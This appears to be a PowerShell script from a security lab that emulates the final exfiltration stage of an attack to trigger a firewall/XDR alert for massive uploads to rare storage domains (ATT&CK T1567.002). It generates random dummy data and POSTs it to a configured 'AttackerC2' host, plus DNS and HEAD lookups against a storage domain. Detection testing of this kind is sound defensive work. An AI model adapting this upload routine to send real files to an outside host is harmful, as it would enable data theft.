<#
    Stage 3 (END) - Exfiltration: massive upload to a rare storage/mail domain
    =========================================================================
    The payoff - a large volume of (dummy) data pushed to an external storage /
    mail service the org rarely uses.

      EAL alert : 'Massive upload to a rare storage or mail domain'  (T1567.002)
      ATT&CK    : Exfiltration (TA0010) / Exfiltration Over Web Service: Cloud (T1567.002)
      NOTE: StorageDomain is a REAL online-storage domain so the destination
            genuinely categorises as online-storage/webmail. By default the bulk
            volume goes to your lab drop (AttackerC2) and StorageDomain only gets a
            small categorisation touch (DNS + HEAD) - so we do NOT dump tens of MB
            on a public third party. To fire the exact VOLUME-based detector, point
            StorageDomain at a real online-storage host YOU control and set
            UploadVolumeToStorage=$true; the bulk upload then lands on a genuinely
            categorised rare-storage domain. Enable the detector in Cortex if off.
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

$storage   = if ($cfg.StorageDomain) { $cfg.StorageDomain } else { $cfg.AttackerC2 }
$volTarget = if ($cfg.UploadVolumeToStorage -and $cfg.StorageDomain) { $cfg.StorageDomain } else { $cfg.AttackerC2 }
Write-Stage "STAGE 3 (END): $($cfg.ExfilMegabytes) MB bulk upload -> $volTarget ; categorisation touch -> $storage" "INFO"
if ($cfg.DryRun) {
    Write-Host "  DRY: POST $($cfg.ExfilMegabytes) MB -> http://$volTarget/upload  ; categorise DNS/HEAD -> $storage"
} else {
    # Real category signal: resolve + a small HEAD to the real online-storage domain
    # (categorises as online-storage/webmail via DNS/SNI without pushing bulk data at it).
    try { Invoke-Dns -Name $storage -Type A -Label "storage categorise" } catch {}
    try { Invoke-WebRequest -Uri "https://$storage/" -Method Head -TimeoutSec $cfg.HttpTimeoutSec -UseBasicParsing | Out-Null
          Write-Stage "  categorisation touch to online-storage domain $storage" "OK" }
    catch { Write-Stage "  categorisation touch to $storage ($($_.Exception.Message.Split([char]10)[0]))" "BLOCK" }

    # Real large outbound flow (the 'massive upload' volume) to the bulk target.
    $tmp = Join-Path $env:TEMP "eal_c8_exfil.bin"
    try {
        $fs=[System.IO.File]::Create($tmp); $b=New-Object byte[] (1MB); $r=[System.Random]::new()
        for($i=0;$i -lt $cfg.ExfilMegabytes;$i++){ $r.NextBytes($b); $fs.Write($b,0,$b.Length) }; $fs.Close()
        try { Invoke-WebRequest -Uri "http://$volTarget/upload" -Method Post -InFile $tmp -ContentType "application/octet-stream" -TimeoutSec $cfg.HttpTimeoutSec -UseBasicParsing | Out-Null
              Write-Stage "  uploaded $($cfg.ExfilMegabytes) MB to $volTarget" "OK" }
        catch { Write-Stage "  upload to $volTarget rejected (large outbound flow still logged)" "BLOCK" }
    } catch { Write-Stage "  payload error: $($_.Exception.Message)" "WARN" }
    finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue } }
}
Invoke-TestDns -Category "dns-infiltration"
Invoke-TestDns -Category "proxy"
Write-Stage "STAGE 3 done. Expect FW NGFW: DNS-Security dns-infiltration/proxy + online-storage category on $storage + (once enabled) EAL 'Massive upload to rare storage/mail' T1567.002 (set UploadVolumeToStorage for the exact volume signal)." "OK"
